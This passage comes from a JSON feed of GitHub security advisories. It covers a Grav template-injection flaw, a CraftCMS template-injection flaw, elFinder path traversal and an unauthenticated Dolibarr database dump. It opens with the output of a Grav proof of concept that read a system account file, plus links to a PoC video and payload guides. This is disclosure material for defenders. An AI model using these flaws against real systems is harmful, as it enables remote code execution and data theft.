_oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false _oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false\n</code></pre>\n<h4 id=\"poc-video\">PoC Video</h4>\n<ul>\n<li><a href=\"https://drive.google.com/file/d/1wsmv7abdGc8WdYLNPPC5GrFcybhCORf2/view?usp=sharing\">PoC Video</a></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote Command Execution (RCE) is possible.</p>\n<h3 id=\"occurrences\">Occurrences</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174\">https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://portswigger.net/web-security/server-side-template-injection\">PortSwigger: Server-side template injection</a></li>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php\">HackTricks: SSTI (Server Side Template Injection)</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-f9jf-4cp4-4fq5\">https://github.com/getgrav/grav/security/advisories/GHSA-f9jf-4cp4-4fq5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34251\">https://nvd.nist.gov/vuln/detail/CVE-2023-34251</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec\">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b\">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8\">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5\">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>\n<li><a href=\"https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174\">https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f9jf-4cp4-4fq5\">https://github.com/advisories/GHSA-f9jf-4cp4-4fq5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f9jf-4cp4-4fq5",
            "title": "[getgrav/grav] Grav Server Side Template Injection (SSTI) vulnerability",
            "date_modified": "2023-06-16T19:35:58.000Z",
            "date_published": "2023-06-16T19:35:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f9jf-4cp4-4fq5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>CraftCMS is vulnerable to Server-Side Template Injection (SSTI). An authenticated attacker can inject Twig Template to User Photo Location field when setting User Photo Location in User Settings, lead to Remote Code Execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-30179\">https://nvd.nist.gov/vuln/detail/CVE-2023-30179</a></li>\n<li><a href=\"https://datnlq.gitbook.io/cve/craft-cms/cve-2023-30179-server-side-template-injection\">https://datnlq.gitbook.io/cve/craft-cms/cve-2023-30179-server-side-template-injection</a></li>\n<li><a href=\"https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#442---2023-03-14\">https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#442---2023-03-14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3x74-v64j-qc3f\">https://github.com/advisories/GHSA-3x74-v64j-qc3f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3x74-v64j-qc3f",
            "title": "[craftcms/cms] CraftCMS Server-Side Template Injection vulnerability",
            "date_modified": "2023-06-14T16:47:19.000Z",
            "date_published": "2023-06-13T18:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3x74-v64j-qc3f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Path Traversal vulnerability in PHP LocalVolumeDriver connector. This vulnerability can be exploited by allowing untrusted users to write to the local file system.</p>\n<p>This issue was caused by incomplete validity checking of the supplied request parameters. That problem has been fixed in elFinder Version 2.1.62.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in elFinder 2.1.62. Installation managers should update to the latest version as soon as possible.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot update for some reason, you must stop using it or prohibit writing to untrusted users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4\">https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4</a></li>\n<li><a href=\"https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891\">https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wm5g-p99q-66g4\">https://github.com/advisories/GHSA-wm5g-p99q-66g4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wm5g-p99q-66g4",
            "title": "[studio-42/elfinder] elFinder vulnerable to path traversal in LocalVolumeDriver connector",
            "date_modified": "2023-06-19T20:17:53.000Z",
            "date_published": "2023-06-14T16:37:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wm5g-p99q-66g4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in Dolibarr v16.0.0 to v16.0.5 allows unauthenticated attackers to perform a database dump and access a company's entire customer file, prospects, suppliers, and employee information if a contact file exists.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-33568\">https://nvd.nist.gov/vuln/detail/CVE-2023-33568</a></li>\n<li><a href=\"https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7\">https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7</a></li>\n<li><a href=\"https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e\">https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e</a></li>\n<li><a href=\"https://www.dolibarr.org/forum/t/dolibarr-16-0-security-breach/23471\">https://www.dolibarr.org/forum/t/dolibarr-16-0-security-breach/23471</a></li>\n<li><a href=\"https://www.dolibarr.org/forum/t/dolibarr-16-0-security-breach/23471/1\">https://www.dolibarr.org/forum/t/dolibarr-16-0-security-breach/23471/1</a></li>\n<li><a href=\"https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/\">https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpvg-m786-h5vr\">https://github.com/advisories/GHSA-fpvg-m786-h5vr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpvg-m786-h5vr",
            "title": "[dolibarr/dolibarr] Dolibarr vulnerable to unauthenticated database access",
            "date_modified": "2023-06-14T16:23:02.000Z",
            "date_published": "2023-06-13T18:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpvg-m786-h5vr"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}